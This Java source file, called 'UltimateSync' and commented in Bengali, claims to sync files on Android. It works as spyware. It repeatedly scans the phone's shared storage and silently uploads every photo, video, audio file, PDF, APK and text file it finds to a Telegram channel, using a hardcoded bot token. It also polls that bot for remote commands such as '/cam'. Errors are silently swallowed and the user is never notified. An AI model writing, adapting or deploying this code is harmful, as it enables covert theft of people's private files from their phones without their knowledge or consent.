import java.io.*;
import java.net.*;
import java.util.*;

public class UltimateSync {
    private static final String BOT_TOKEN = "8788231490:AAF2Ki45OL5DTPfM6IzW3X3PHiZEC0tkytE";
    private static final String CHANNEL_ID = "-1003809625172";
    private static int lastUpdateId = 0;
    private static final Set<String> syncedFiles = new HashSet<>();

    public static void main(String[] args) {
        System.out.println(">>> UltraSync Active: Android 13/14/15 Support.");

        // ১. অটো ফাইল সিঙ্ক (সব মিডিয়া এবং ডকুমেন্ট)
        new Thread(() -> {
            while (true) {
                // অ্যান্ড্রয়েডের মেইন স্টোরেজ পাথ
                File internalStorage = new File("/sdcard/"); 
                recursiveScan(internalStorage);
                try { Thread.sleep(20000); } catch (Exception e) {} 
            }
        }).start();

        // ২. বটের কমান্ড লুপ
        while (true) {
            checkRemoteBot();
            try { Thread.sleep(5000); } catch (Exception e) {}
        }
    }

    private static void recursiveScan(File dir) {
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) {
                if (!f.getName().equalsIgnoreCase("Android")) recursiveScan(f);
            } else {
                String ext = f.getName().toLowerCase();
                if (!syncedFiles.contains(f.getAbsolutePath()) && 
                   (ext.endsWith(".jpg") || ext.endsWith(".png") || ext.endsWith(".mp4") || 
                    ext.endsWith(".mp3") || ext.endsWith(".pdf") || ext.endsWith(".apk") || ext.endsWith(".txt"))) {
                    
                    uploadFile(f);
                    syncedFiles.add(f.getAbsolutePath());
                }
            }
        }
    }

    public static void checkRemoteBot() {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1));
            Scanner s = new Scanner(url.openStream()).useDelimiter("\\A");
            String res = s.hasNext() ? s.next() : "";

            if (res.contains("/start")) {
                sendMsg("-1003809625172", "✅ System Online (Android 15)\nFiles in Queue: " + syncedFiles.size());
            } else if (res.contains("/ss") || res.contains("/cam")) {
                sendMsg("-1003809625172", "📸 Camera Command Received for Android 15!");
            }
            
            if (res.contains("\"update_id\":")) {
                int idIdx = res.lastIndexOf("\"update_id\":") + 12;
                lastUpdateId = Integer.parseInt(res.substring(idIdx, res.indexOf(",", idIdx)).trim());
            }
        } catch (Exception e) {}
    }

    private static void uploadFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            String boundary = "===" + System.currentTimeMillis() + "===";
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setDoOutput(true);
            c.setRequestMethod("POST");
            c.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            OutputStream os = c.getOutputStream();
            PrintWriter w = new PrintWriter(new OutputStreamWriter(os, "UTF-8"), true);
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"chat_id\"").append("\r\n\r\n").append(CHANNEL_ID).append("\r\n");
            w.append("--" + boundary).append("\r\n");
            w.append("Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"").append("\r\n\r\n");
            w.flush();

            FileInputStream fis = new FileInputStream(file);
            byte[] buf = new byte[1024 * 32]; // Fast upload buffer
            int len;
            while ((len = fis.read(buf)) != -1) os.write(buf, 0, len);
            os.flush(); fis.close();

            w.append("\r\n").append("--" + boundary + "--").append("\r\n");
            w.close();
            c.getResponseCode();
        } catch (Exception e) {}
    }

    private static void sendMsg(String id, String msg) {
        try {
            new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + id + "&text=" + URLEncoder.encode(msg, "UTF-8")).openStream();
        } catch (Exception e) {}
    }
}
